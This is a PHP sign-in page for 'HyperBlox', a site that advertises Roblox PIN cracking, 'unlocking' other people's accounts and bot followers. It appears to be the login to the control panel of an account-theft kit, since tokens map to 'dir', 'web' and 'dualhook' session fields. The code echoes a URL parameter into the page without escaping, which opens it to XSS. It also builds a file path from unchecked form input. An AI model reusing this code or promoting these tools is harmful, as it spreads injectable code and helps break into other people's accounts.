<?php
session_start();
$sack = $_GET['token'] ?? '';
$sack = '"'.$sack.'"';

require_once __DIR__ . '/apis/persistence.php';
$tokensDir = hb_tokens_dir();
hb_ensure_dir($tokensDir);

if(isset($_SESSION['token'])) {
    header("Location: dashboard.php");
    exit();
}

$token = $_POST['token'] ?? '';
if($token) {
    $tokenFile = hb_tokens_dir() . $token . '.txt';
    if(file_exists($tokenFile)) {
        $chk = file_get_contents($tokenFile);
        $ex = array_map('trim', explode("|", $chk));
        
        if(count($ex) >= 3) {
            $_SESSION['token'] = $ex[0];
            $_SESSION['dir'] = $ex[1];
            $_SESSION['web'] = $ex[2];
            $_SESSION['dualhook'] = $ex[3] ?? ''; // Dualhook is optional (4th field)
            header("Location: dashboard.php");
            exit();
        } else {
            $js = 'Swal.fire({
                title: "Error",
                text: "Invalid token!",
                icon: "error",
                background: "#0f172a",
                color: "#f8fafc",
                confirmButtonColor: "#8b5cf6",
                customClass: {
                    popup: "swal-dark",
                    title: "swal-title",
                    confirmButton: "swal-confirm"
                },
                buttonsStyling: false,
                iconHtml: \'<i class="fas fa-times-circle" style="color: #ef4444; font-size: 60px;"></i>\'
            });';
        }
    } else {
        $js = 'Swal.fire({
            title: "Error",
            text: "Invalid token!",
            icon: "error",
            background: "#0f172a",
            color: "#f8fafc",
            confirmButtonColor: "#8b5cf6",
            customClass: {
                popup: "swal-dark",
                title: "swal-title",
                confirmButton: "swal-confirm"
            },
            buttonsStyling: false,
            iconHtml: \'<i class="fas fa-times-circle" style="color: #ef4444; font-size: 60px;"></i>\'
        });';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="HyperBlox">
    <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
    <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
    <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta property="og:image" content="/files/hyperblox.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://hyperblox.eu/">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
    <meta name="twitter:site" content="https://hyperblox.eu/">
    <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
    <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
    <meta name="theme-color" content="#000000">
    <meta name="msapplication-TileColor" content="#000000">
    <meta itemprop="name" content="HyperBlox">
    <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
    <title>Sign In - HyperBlox</title>
    <link rel="icon" type="image/png" href="/files/hyperblox.png">
    <link rel="shortcut icon" href="/files/hyperblox.ico">
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --dark: #0f172a;
            --darker: #020617;
            --light: #f8fafc;
            --gray: #94a3b8;
            --glass: rgba(30, 41, 59, 0.45);
            --glass-border: rgba(255, 255, 255, 0.08);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --shadow-lg: 0 15px 50px rgba(0, 0, 0, 0.25);
            --border-radius: 14px;
        }

        /* SweetAlert Dark Theme */
        .swal-dark {
            background: var(--dark) !important;
            border-radius: 18px !important;
            border: 1px solid var(--glass-border) !important;
            backdrop-filter: blur(10px) !important;
        }

        .swal-title {
            color: var(--light) !important;
            font-family: 'Manrope', sans-serif !important;
            font-weight: 700 !important;
            font-size: 22px !important;
        }

        .swal-confirm {
            background: var(--primary) !important;
            border-radius: 10px !important;
            padding: 10px 24px !important;
            font-family: 'Manrope', sans-serif !important;
            font-weight: 600 !important;
            transition: var(--transition) !important;
        }

        .swal-confirm:hover {
            background: var(--primary-dark) !important;
            transform: translateY(-2px) !important;
        }

        .swal2-html-container {
            color: var(--gray) !important;
            font-family: 'Manrope', sans-serif !important;
        }

        body {
            font-family: 'Manrope', sans-serif;
            background: var(--darker);
            color: var(--light);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.1) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.1) 0px, transparent 50%);
        }

        .auth-card {
            width: 380px;
            background: var(--glass);
            border-radius: var(--border-radius);
            padding: 40px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(10px);
            box-shadow: var(--shadow-lg);
            transition: var(--transition);
        }

        .auth-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
        }

        .auth-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .auth-subtitle {
            color: var(--gray);
            margin-bottom: 30px;
            text-align: center;
            font-size: 15px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
            font-size: 16px;
        }

        .form-input {
            width: 100%;
            padding: 14px 20px 14px 45px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius);
            color: var(--light);
            font-size: 15px;
            transition: var(--transition);
            height: 48px;
            box-sizing: border-box;
        }

        .form-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }

        .auth-btn {
            width: 100%;
            padding: 14px;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .auth-btn:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
        }

        .auth-btn:active {
            transform: translateY(0);
        }

        .auth-btn i {
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="auth-card">
        <h1 class="auth-title">Sign In - HyperBlox</h1>
        <p class="auth-subtitle">Unlock the full potential of Roblox with our powerful tools.</p>
        
        <form method="post" id="login-form">
            <div class="input-group">
                <i class="fas fa-key input-icon"></i>
                <input type="text" class="form-input" placeholder="Enter Token" name="token" value=<?php echo $sack; ?> autocomplete="off" required>
            </div>
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                <a href="/controlPage/get-token.php" style="color:#8b5cf6;text-decoration:none;font-size:14px;">Don’t have a token?</a>
            </div>
            <button type="submit" class="auth-btn">
                <i class="fas fa-sign-in-alt"></i>
                Sign In
            </button>
        </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            const btn = this.querySelector('button');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
        });
        
        <?php echo $js ?? ''; ?>
    </script>
</body>
</html>